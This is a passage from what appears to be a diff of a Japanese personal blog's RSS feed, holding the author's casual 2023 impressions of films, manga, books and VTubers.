一方で妻とは急に和解していて（理由はよくわからなかった），また最後のシーンでは「人生は祭りだ．共に生きよう」と言って過去の人たち全員がおそろいの衣装で輪を作って踊る．最終的に少年だった自分（白い衣装に変わっている！）が退場して終わる ここまで見てやっと最初のシーンが理解できた．映画製作から逃げたい自分（空に浮かぶ自分）とそれをよしとしない周囲の関係者たち（グイドの足をヒモでつないで引き下ろそうとする）ということだろうか カッコーの巣の上で 刑務所逃れのために精神病を詐称したマクマーフィは精神病院に入院するが，その精神病院では婦長の管制下に置かれた生活を強いられる．マクマーフィはその環境に色々反発して最終的に脱走を試みるが．．．みたいな話 鬱エンドかと思ったらそうではなかった なんとなくチーフが鍵なんだろうなと思ってたらもはや主役だった カッコーの巣は英語で精神病院の蔑称らしい．そう考えてもチーフの話なんだなって感じがします 正直アメリカのここら辺の歴史(1960)は全く分からない．ネイティブアメリカンは現在約 7 割が都市に移住しているらしいが（正確な数字は分からない），この都市移住計画は結局ネイティブアメリカンの生活状況の改善に至らず，社会の同化も達成できなかった．結局，解体された部族と差別・貧困だけが残されたネイティブアメリカンはホームレス，アル中みたいな問題に巻き込まれてしまう．アメリカ政府にとって異質ななネイティブアメリカンを，管制下で管理し，正常な社会に同化させようという流れはこの精神病院と似ている．マクマーフィは管理から反発するが，結局ロボトミー手術によって無力化されてしまう．どれだけ抗っても社会の大きな流れを変えることはできないという鬱エンドかと思ったが，チーフは誰もが無理だと思っていた給水場を破壊し持ち上げ，窓を割って脱出する チーフがマクマーフィを殺した経緯はよくわからなかったが，ネイティブアメリカンにとって死は魂が肉体から解放されるという意味で救済らしいので，無力化されたマクマーフィを救済したんだろうと思う イージーライダー アメリカ人の二人が麻薬取引で手に入れた大金をもとにバイクに乗って色々する話 本当に自由であることを求めて旅する二人は当時のアメリカ人にとっては有害なのか単にヒッピーだからなのかは知らないが迫害をうける アメリカが説くような自由はあくまである程度制約をうけたうえでの自由であり，本来の意味で自由だと劇中の麻薬は当然殺人も許可されるような環境になる．結果，映画のようにあっけなく殺されてしまうんだと思った アニーホール コメディ部分は面白い ウディ・アレンの度量の狭さというか自分の価値観からしかものを見れない性格はなんともいえない 最初はうまくいっていても物理的に空間を共有し始めるととたんに互いのいやなところが見え始めて（それが同棲だろうけど）距離をとろうとするが，距離を取った瞬間にその虚無感を他責で埋めようとする（僕を愛していたくせに，みたいな）感じ さらば冬のかもめ 自分でなんとかできることを分かっているニコルソンとできないことの区別がついてないラリーの対比がよかった あっけなく分かれてしまうのも自分ではどうしようもない感じがしていい グリーンブック 人種差別というよりはマイノリティに焦点を当てた映画だと思う．ドンは黒人だけどそれ以上に孤立しているし両性愛だし，みたいな 時代が変われば価値観も変わるので，この時代にこれだけ乱雑に生きることができた人たち（主人公）と丁寧なくらし（現代から見れば当然のふるまいだけど）を意識している人が対立するのは当然で，この価値観とかを互いに分け合っているように見える 贖罪のようにこういったテーマの映画を作っていると思われるかもしれないし，まあ当人からしたらあんまりおもしろくはないと思う パーマネントバケーション アンチドラマをテーマにしているらしく，けだるい感じで何も起こらない退屈なものから逃げ出すことはできない，みたいなことを伝えたいらしいがよくわかっていない 単に不良の自分に酔っているような気もした ゴッドファーザー まだ 1 しか見てない 弁護士のトムが一番好き ブルーアワーにぶっ飛ばす 夏帆とシムウンギョンが出演していて，夏帆とシムウンギョンは親友という体で描かれているが，実はシムウンギョンは夏帆のイマジナリーフレンドで，夏帆は田舎を嫌う自分，シムウンギョンは田舎を好きになりたい自分ということらしい イマジナリーフレンドだろうというのは最後の夫が部屋を横切るシーンで分かったが，そうするとつじつまが合わない場面が多々ある 夏帆がもともと田舎を嫌っていた理由とか悩んでいる原因とかもよくわからない．田舎を嫌っていそうな雰囲気は伝わるけど（両親とか兄の漢字から）悩み事については特に言及されていない その男，凶暴につき ソナチネ キッズリターン ラヂオの時間 唐沢寿明あんなかっこいいの？？ スタンドバイミー つらくなってしまったよ かもめ食堂 映像がきれいだった．北欧だからなのかは知らない あいつ最後までコーヒータダ飲みしてったな ピンポン あの髪型でまともに映れるの窪塚洋介だけだろ．．．まじで結婚してくれ mid90s レイがかっこよすぎる ああいう不幸に憧れるというか，やる気がない方がかっこいいみたいな雰囲気って中学生くらいに体験したなあと懐かしくなった 桐島，部活やめるってよ Lock, Stock and Two Smoking Barrels バイオレンスかと思ったけど意外とコメディだった ヴィニー・ジョーンズかっこいい タクシードライバー 確定してしまっている貧する自分の未来とかベッツィーに激昂されてしまった怒り 店で強盗を銃殺するのがきっかけで自信がついてしまって，無駄にアイリスを救おうとする アイリスにとっては今が楽なので救ってもらおうみたいな考えはない トラヴィスがモヒカン＋サングラスにしたときは怖かった スポーツと娼館のおじいさんを殺して自殺しようとするが最後は弾切れで死ねない 最後自殺できてたら丸く収まっていたと思うけどトラヴィスが野放しにされているのが結構怖い 都会のアリス アメリカに失望した主人公は自分を見失っていた(写真を撮っても薄っぺらい，仕事もうまくいかない) どこの国にもアメリカに対する憧れがあったんだろうか 主人公がアリスと一緒に旅をする，他者を受け入れることで自分以外の価値観を得，状況を打開するような映画 結局主観的にしか物事を見ることができなかった主人公が視点を広げることができたという話だと思う 今の自分ではよく分からない 主人公犯罪者に間違われそう CURE ほんとうに面白かった 直接言ってるように青髭をプロットの元にしている 間宮は自我を喪失している精神病患者で，研究していた催眠術のようなものを用いて人間の自我を引き出すことができる この自我は無意識下に存在する自分の欲求(?</description>
+      <guid>http://side-realms.github.io/log/log/</guid>
+      <description>2023 (6月~) 映画を見始めた一方でゲームは少なめだった． 映画って贅沢な時間の使い方だなあと思いつつ，もっといろいろ見ておけばよかったなとも思う． アニメに全然手を出せていないし今年は何の因果か全方位からガンダムを勧められたので来年はきっと観ます．．．
+こういう感想を書くの最初は苦手だったけどだんだん書けるようになってきて楽しい． そして語彙力の無さを痛感する．．．
+「ほんとうにつらい」ではなくてそれを言語化できるようになりたい
+本マジで読んでなくて反省
+Vtuber を狂ったように見ていた． 特にぽこピー・ミミック・おむらいす食堂あたり
+個人勢マジでおもしろいな．．．
+あおぎり高校もよかった
+漫画 ジョジョの奇妙な冒険：一部 岸部露伴は動かない ブルーピリオド 呪術廻戦 禪院真希かっこよすぎる．覚醒前も後も好き ブルーロック 絵，うますぎない？ 千切豹馬すき チェンソーマン 落下の悪魔のデザイン良すぎる 東京卍リベンジャーズ 三ツ谷と場地がかっこよすぎる ルリドラゴン 絵もかわいいしシナリオもローカルなファンタジーって感じがしてすごく好き 休載つらい&amp;hellip; 安静にしてください&amp;hellip; 光が死んだ夏 神系のホラーはよくあるけど切り口が新しくてとてもいい あかね噺 朱音かわいいね．．． 落語見てみようかな サンダー3 GANTZだと聞いていたけど思ってたよりGANTZだった 二頭身シーンの絵がすごいかわいい 壮大な話だと展開が遅く感じてしまうな 亜人 戦闘シーンかっこよすぎる 「死なない」だけだと直接の強さにならないけど使う人が使うとこんな使い方があるんだと思う 刷ったもんだ！ 印刷業全く知らなかったから勉強にもなる ムルシエラゴ いや，下心はないんで 黄泉のツガイ 荒川弘の新作，アツすぎる キャラクターが多いのにちゃんと覚えられるのはキャラが立ってるからだろうと思う リバイアサン 劇画が話と合ってていい 裏バイト 死体清掃の回が一番怖い 不死身のパイセン ホラーコメディかと思ったら油断した アフターゴッド つらい 絵がうますぎる，部屋とか建物の絵が異常にうまい 「綺麗な顔」を描くのもうまい これまで言葉でしか語られなかった心情を悲劇の過程で具体的に絵で描く，みたいな，最悪の事態の結果，誰かからの愛を知ることになる，みたいな，そういうどうしようもない感情を描くのがうまい 僕の部屋のユウ子さん 泣いちまったよ この世は戦う価値がある はぐれ人魚のディアナ 江口さんはゲーム脳 雷雷雷 あくたの死に際 怪異と乙女と神隠し 一勝千金 ヴァンピアーズ 合コンに行ったら女がいなかった件 一昔前の二次創作みたいな絵柄でめちゃめちゃ好き pixiv 漁ってた頃を思い出す ウェルベルム よくある殺し合い漫画だけど殺しに重きを置いてないのがいい 絵もいい 鉄コン筋クリート ネズミ，かっこいいよ クロのつらさとかシロの強さが絵柄にあってると思う ピンポン ペコかっこいい 多分星野が主人公だと思う．そうであってほしい それでも町は廻っている 7億周くらい読んでる 時系列シャッフルすごくおもしろいからどこかで一回まとめたいな 歩鳥がただの天然じゃなくて意外としっかりしてるところがあってキャラ倒れしてないのが本当に好き 真田との関係も多くは語らないし，多分歩鳥自身もまだ日常が続いてほしいと思っているんじゃないかと思う(にしんそばの話にもあったような感じ) 小ネタの数とか細かい伏線が回収されていて，どこまで想定して描いてるのか分からなくて怖くなる たけるとエビちゃんの話ももっと読みたかった 不安の種 初代はマジで怖かったけどアスタリスクの方はオムニバスっぽくてあまり怖くない タコピーの原罪 胸糞エンドじゃなくてほんとうによかった ROPPEN 話がただ殺し合うだけじゃなくて面白い 政治を黒幕に出すんじゃなくて初めから出てくるのは印象がいい 極楽街 絵がうますぎる ダラとネイがかわいい 個人的に一番アツい パラレルリープシンドローム 絵がかわいい ただのタイムリープ系かとおもったらもう一つひねってていい 変な家 間取りの理由が一巻だけで終わりならイマイチだったけど予想以上に広がってておもしろい おやすみプンプン これを鬱漫画だと褒めたたえる人間と仲良くなれない プンプンの半生を南条視点で描いている プンプン視点の話はおそらくラスト3話だけ プンプン自身が声を発しているのも愛子ちゃんとの回想シーンだけ 死にたがっているプンプンが南条に飼い殺されるエンドなのでプンプンにとってはバッドエンドだと思う 愛子ちゃんはずっと「運命」「信仰」みたいなものを意識していて，多かれ少なかれ母が信仰する異常な宗教の影響はあったんだろうと思う 愛子ちゃんが自殺する直前は多分彼女にとって一番幸せな瞬間で（運命の人と両想いになれている，っていう話から），その瞬間を残しておきたかったからなのか，それともプンプンの記憶に一生残り続けたいからなのかはよく分からないけど結局死んでしまった 最終巻，七夕の日にプンプンが愛子ちゃんの夢を見るシーンは本当につらかった 殺人を共有して，最終的に目の前で自殺されてしまってもプンプンは愛子ちゃんのことを忘れていってしまうっていうのが救われない（覚えていたらそれはそれで） 最後まで現実と戦ってた南条の勝ち（表現が正しいかはわからないけど）なんだろうと思う 愛子ちゃんと南条の印象が大きすぎるけどプンプンママ好きだった 暗殺教室 久しぶりに読んだ アニメの方がよかった 鋼の錬金術師 久しぶりに読んだ 絵がうまい ロイアイって無いんですか&amp;hellip;そうですか&amp;hellip; BANANA FISH 寝込んだ 最後のがやりたかっただけだろ！って思いながら寝込んだ 奇子 閉鎖的な，ムラ的な雰囲気が感じられていい 奇子が異常にエロくて手塚治虫のキモさを感じた．エロいというよりグロいかもしれない 近親相姦の背景があるからだと思う 奇子周りが全滅するか否かが単行本と連載版の違いらしい 敗戦国である日本に漂う角張ったプライドと閉鎖感と人間の業の深さ，それに対抗する人間の力強さ（？）みたいなものが色んな人を通して描かれている． 奇子は自らの意思で運命に抗っているようには思わないけど，結果的にそうなっているように見える 下山事件を踏まえつつ，一族の複雑な関係を描いていて怖い 続きがあるのか，もう少し長く描いてほしかった どろろ どろろかわいいね もう今更妖怪の造詣に感動することはないが，この時代のクオリティにしては高すぎるとは思う 最初に地獄堂で祈る場面は異常に絵がうまくて感動した 夢幻紳士 絵がかわいい こんなに仰々しい絵をしているのに話の気が抜けてていい ソラニン 女の子はかわいい バンドの道を進むことを信号無視と対比してその結果失敗する，っていう表現はいいけど自分で解説しちゃうのが寒い うみべの女の子 女の子はかわいい 大瀧詠一の 1st 聴いてる女子高生良すぎるだろ 最後にフラれた小梅の表情好き ネムルバカ マジでよかった 変な余韻を残したり深いような表現をしないで，ただ一般の日常が流れるように鯨井が消息を絶つのがすごく切ない 虹ヶ原ホログラフ すごくよかった，浅野いにおは中身のない漫画よりこういう SF を描いてほしい(身勝手) 妖怪の「件」を中心に据えた構成 タイムラインがごちゃまぜになってて考察の余地が広い ブリキ缶はなんだ？ 件の持つ能力をブリキ缶に対応させているとするなら，鈴木は予言の力をもたないことになる 鈴木の本名(天彦)は天人の意味をもつから，鈴木は件としての力ももち，天人としての力ももつことになる． 「強い意志をもちなさい」というセリフは件の力を持ちながら行使するな，ということだと思う 1999 素晴らしき日々 ひかりのまち 零落 世界の終わりと夜明け前 デッドデッドデーモンズデデデデデストラクション すごくよかった ラストの「時空が歪んじゃうよ！」っていうのは，戦争中の世界からの凰蘭と門出がタイムマシンを使ってタイムリープ後の世界に来たから発言しているのだと思う（リープ後の門出たちと戦争中の門出たちが鉢合わせてはいけない）．リープ後の凰蘭は「はにゃにゃふわ～～」なんて言ってないし なので戦争中の凰蘭と門出は生きているんじゃないだろうか タイムリープの話が出たときはテンション上がった．これくらい壊してくれていい どうせなら戦争中の世界で話を終わらせてほしかったがまあ難しいんだろうな．．． うずまき 最高 ドラゴンヘッド かなり怖いけど大好き ずっと酸素が薄い感じがする 火災旋風のあたりから本当に怖くなった 海辺へ行く道 純文学みたいな感じがする 白黒なのに空とか海が青いように見える 密度が濃いというか一週間に一冊くらいがちょうどいい 透明通信 きれいなつげ義春 夜空が銀河鉄道の夜みたいな雰囲気を感じる マッチ一本がよかった ウツロボロス エグい 丸尾末広の系譜なんだろうがただの性癖さらしになっててキツいと思ってしまう Present for me ヒーローの話が好き よつばと！ 季節の表現が上手ですき つげ義春全集 ねじ式 ★ ゲンセンカン主人 夢の散歩 アルバイト 雨の中の慾情 夜が掴む コマツ岬の生活 外のふくらみ 必殺するめ固め ヨシボーの犯罪 ★ 窓の手 夏の思いで ★ 懐かしいひと ★ 事件 ★ 退屈な部屋 ★ 日の戯れ ★ 外天楼 きちい 阿呆にも歴史がありますの 空気の底 処刑は3時に終わった ジョーを訪ねた男 夜の声 野郎と断崖 グランド・メサの決闘 うろこが崎 暗い窓の女 ★ そこに穴があった ★ わが谷は未知なりき 猫の血 ★ 電話 カメレオン 聖女懐妊 ★ カタストロフ・イン・ザ・ダーク ロバンナよ ふたりは空気の底に ★ 人間昆虫記 十村十枝子は本名がウスバカゲロウからきているらしい(臼場かげり)．アリジゴクってことですね． 十村が芥川賞を受賞したシーンから始まるが，物語が進むにつれて十村は様々な人の作品を模倣して活動していることが分かっていく．作家として，演出家として名を上げた十村の作品は模倣（なんならそのままパクリ）によって成立していることが分かる． 模倣された側の人間は様々な方法で破滅していく 十村はずっと「満たされない」みたいなことを主張して，蝋人形の母親にすがっているが，これは模倣ばかりで中身がない活動ばかりしているから，という単純な理由だと思う 世間から見れば十村の作品が模倣だろうがオリジナルだろうが関係ない，という二面性も作品の芯だと思う ユニコ ユニコまじでかわいい 家族と会う話が一番好き コーンが可愛すぎる あの終わり方切なすぎるだろが アドルフに告ぐ 記者である峠草平のもとに弟から連絡があり，「重要な書類を預かってほしい」と頼まれる 草平が弟のもとを訪れると，重要書類は無事だったものの既に弟は惨殺されている その重要書類の内容は「アドルフ・ヒトラーが，実はユダヤ人の血を引いている」というもの(フィクション) この書類をめぐっていろんな人が争うことになる アドルフ・カウフマンが特に気になった 日本とドイツのハーフであり，最初は日本に居続けたいと思っているが，だんだんとナチズムに染まってしまう 言わずともアドルフ・カミルとの関係性が徐々に変化していくのは心を削られる カミルの父親を殺してしまうシーンはカウフマンの人種に対するコンプレックスがあらわれていると思うし，ここで「ユダヤ人を殺す」ことを手段の選択肢として持ってしまうことが印象的だった WW2後にナチスが崩壊した後も描いている ユダヤ人は自分たちの祖国をパレスチナに建設しようとする もともと住んでいたアラブ民族がそれに反抗する 最後に「おれの人生は何だったんだろう」とつぶやくカウフマンが切ない 結局それぞれに正義があって，その証明としてもっとも単純なのが戦争だっていうことだと思う そんなものが正義だと思わないけど，当事者でもなく，寝転びながら手塚治虫を読んでいられるような自分が浅薄に意見できることでもないとも思う リボンの騎士 リボンの騎士 野ばらの精 虹のプレリュード 双子の騎士 リボンの騎士よりも少女漫画っぽい ジャングル大帝 W3 素晴らしい終わり方だと思う きりひと讃歌 新選組 時代考証がハチャメチャで色々騙された 本 豊井裕太 水と手と目 大阪圭吉 とむらい機関車 デパートの絞刑吏 灯台鬼 花束の虫 香水紳士 銀座幽霊 動かぬ鯨群 あやつり裁判 寒の夜晴れ 石塀幽霊 死の快走船 小酒井 不木 恋愛曲線 岡本かの子 鮨 坂口安吾 白痴 桜の森の満開の下 エドガーアランポー アッシャー家の崩壊 黒猫 早すぎる埋葬 ウィリアム・ウィルスン 岡本綺堂 青蛙堂鬼談 異妖新篇 三島由紀夫 レター教室 逢坂冬馬 同志少女よ、敵を撃て 映画 戦場のメリークリスマス キスされたときの坂本龍一の演技が迫真すぎて笑ってしまった 鬼気迫ってるわけでもないが平和と命の危機がうっすら共存している雰囲気がとても怖い 特に何もなくてもストレスがかかる ほんとうにつらい 最強のふたり もう少し大人になったら分かるんだろうか 8 1/2 名画らしいので見たが，過去・未来・妄想・夢が入り混じったつくりになっていて理解できない部分が多かった カトリックの話がよくでてきていて，主人公自身もカトリックにいい思い出はなさそうだったが，それが話にどう関わっているかはわからない 妻との仲もよくなく，それもそのはずで，妻との旅行でも全く抱こうとせずに映画監督は出演希望の女性ばかりに目を向けている 映画の撮影が始まらない中で，プロデューサーたちは主人公を催促するためにセットを作ったりカメラテストをしたり，撮影直前の記者会見を開いたりと，取り返しのつかない状況を作る 主人公は当然何も話せず机の下にもぐってしまい，最終的にはポケットの中の拳銃で自殺する．．．という妄想をする．当然生きているが映画監督としてのキャリアはもう死んでしまった 一方で妻とは急に和解していて（理由はよくわからなかった），また最後のシーンでは「人生は祭りだ．共に生きよう」と言って過去の人たち全員がおそろいの衣装で輪を作って踊る．最終的に少年だった自分（白い衣装に変わっている！）が退場して終わる ここまで見てやっと最初のシーンが理解できた．映画製作から逃げたい自分（空に浮かぶ自分）とそれをよしとしない周囲の関係者たち（グイドの足をヒモでつないで引き下ろそうとする）ということだろうか カッコーの巣の上で 刑務所逃れのために精神病を詐称したマクマーフィは精神病院に入院するが，その精神病院では婦長の管制下に置かれた生活を強いられる．マクマーフィはその環境に色々反発して最終的に脱走を試みるが．．．みたいな話 鬱エンドかと思ったらそうではなかった なんとなくチーフが鍵なんだろうなと思ってたらもはや主役だった カッコーの巣は英語で精神病院の蔑称らしい．そう考えてもチーフの話なんだなって感じがします 正直アメリカのここら辺の歴史(1960)は全く分からない．ネイティブアメリカンは現在約 7 割が都市に移住しているらしいが（正確な数字は分からない），この都市移住計画は結局ネイティブアメリカンの生活状況の改善に至らず，社会の同化も達成できなかった．結局，解体された部族と差別・貧困だけが残されたネイティブアメリカンはホームレス，アル中みたいな問題に巻き込まれてしまう．アメリカ政府にとって異質ななネイティブアメリカンを，管制下で管理し，正常な社会に同化させようという流れはこの精神病院と似ている．マクマーフィは管理から反発するが，結局ロボトミー手術によって無力化されてしまう．どれだけ抗っても社会の大きな流れを変えることはできないという鬱エンドかと思ったが，チーフは誰もが無理だと思っていた給水場を破壊し持ち上げ，窓を割って脱出する チーフがマクマーフィを殺した経緯はよくわからなかったが，ネイティブアメリカンにとって死は魂が肉体から解放されるという意味で救済らしいので，無力化されたマクマーフィを救済したんだろうと思う イージーライダー アメリカ人の二人が麻薬取引で手に入れた大金をもとにバイクに乗って色々する話 本当に自由であることを求めて旅する二人は当時のアメリカ人にとっては有害なのか単にヒッピーだからなのかは知らないが迫害をうける アメリカが説くような自由はあくまである程度制約をうけたうえでの自由であり，本来の意味で自由だと劇中の麻薬は当然殺人も許可されるような環境になる．結果，映画のようにあっけなく殺されてしまうんだと思った アニーホール コメディ部分は面白い ウディ・アレンの度量の狭さというか自分の価値観からしかものを見れない性格はなんともいえない 最初はうまくいっていても物理的に空間を共有し始めるととたんに互いのいやなところが見え始めて（それが同棲だろうけど）距離をとろうとするが，距離を取った瞬間にその虚無感を他責で埋めようとする（僕を愛していたくせに，みたいな）感じ さらば冬のかもめ 自分でなんとかできることを分かっているニコルソンとできないことの区別がついてないラリーの対比がよかった あっけなく分かれてしまうのも自分ではどうしようもない感じがしていい グリーンブック 人種差別というよりはマイノリティに焦点を当てた映画だと思う．ドンは黒人だけどそれ以上に孤立しているし両性愛だし，みたいな 時代が変われば価値観も変わるので，この時代にこれだけ乱雑に生きることができた人たち（主人公）と丁寧なくらし（現代から見れば当然のふるまいだけど）を意識している人が対立するのは当然で，この価値観とかを互いに分け合っているように見える 贖罪のようにこういったテーマの映画を作っていると思われるかもしれないし，まあ当人からしたらあんまりおもしろくはないと思う パーマネントバケーション アンチドラマをテーマにしているらしく，けだるい感じで何も起こらない退屈なものから逃げ出すことはできない，みたいなことを伝えたいらしいがよくわかっていない 単に不良の自分に酔っているような気もした ゴッドファーザー まだ 1 しか見てない 弁護士のトムが一番好き ブルーアワーにぶっ飛ばす 夏帆とシムウンギョンが出演していて，夏帆とシムウンギョンは親友という体で描かれているが，実はシムウンギョンは夏帆のイマジナリーフレンドで，夏帆は田舎を嫌う自分，シムウンギョンは田舎を好きになりたい自分ということらしい イマジナリーフレンドだろうというのは最後の夫が部屋を横切るシーンで分かったが，そうするとつじつまが合わない場面が多々ある 夏帆がもともと田舎を嫌っていた理由とか悩んでいる原因とかもよくわからない．田舎を嫌っていそうな雰囲気は伝わるけど（両親とか兄の漢字から）悩み事については特に言及されていない その男，凶暴につき ソナチネ キッズリターン ラヂオの時間 唐沢寿明あんなかっこいいの？？ スタンドバイミー つらくなってしまったよ かもめ食堂 映像がきれいだった．北欧だからなのかは知らない あいつ最後までコーヒータダ飲みしてったな ピンポン あの髪型でまともに映れるの窪塚洋介だけだろ．．．まじで結婚してくれ mid90s レイがかっこよすぎる ああいう不幸に憧れるというか，やる気がない方がかっこいいみたいな雰囲気って中学生くらいに体験したなあと懐かしくなった 桐島，部活やめるってよ Lock, Stock and Two Smoking Barrels バイオレンスかと思ったけど意外とコメディだった ヴィニー・ジョーンズかっこいい タクシードライバー 確定してしまっている貧する自分の未来とかベッツィーに激昂されてしまった怒り 店で強盗を銃殺するのがきっかけで自信がついてしまって，無駄にアイリスを救おうとする アイリスにとっては今が楽なので救ってもらおうみたいな考えはない トラヴィスがモヒカン＋サングラスにしたときは怖かった スポーツと娼館のおじいさんを殺して自殺しようとするが最後は弾切れで死ねない 最後自殺できてたら丸く収まっていたと思うけどトラヴィスが野放しにされているのが結構怖い 都会のアリス アメリカに失望した主人公は自分を見失っていた(写真を撮っても薄っぺらい，仕事もうまくいかない) どこの国にもアメリカに対する憧れがあったんだろうか 主人公がアリスと一緒に旅をする，他者を受け入れることで自分以外の価値観を得，状況を打開するような映画 結局主観的にしか物事を見ることができなかった主人公が視点を広げることができたという話だと思う 今の自分ではよく分からない 主人公犯罪者に間違われそう CURE ほんとうに面白かった 直接言ってるように青髭をプロットの元にしている 間宮は自我を喪失している精神病患者で，研究していた催眠術のようなものを用いて人間の自我を引き出すことができる この自我は無意識下に存在する自分の欲求(?</description>
     </item>
     
     <item>
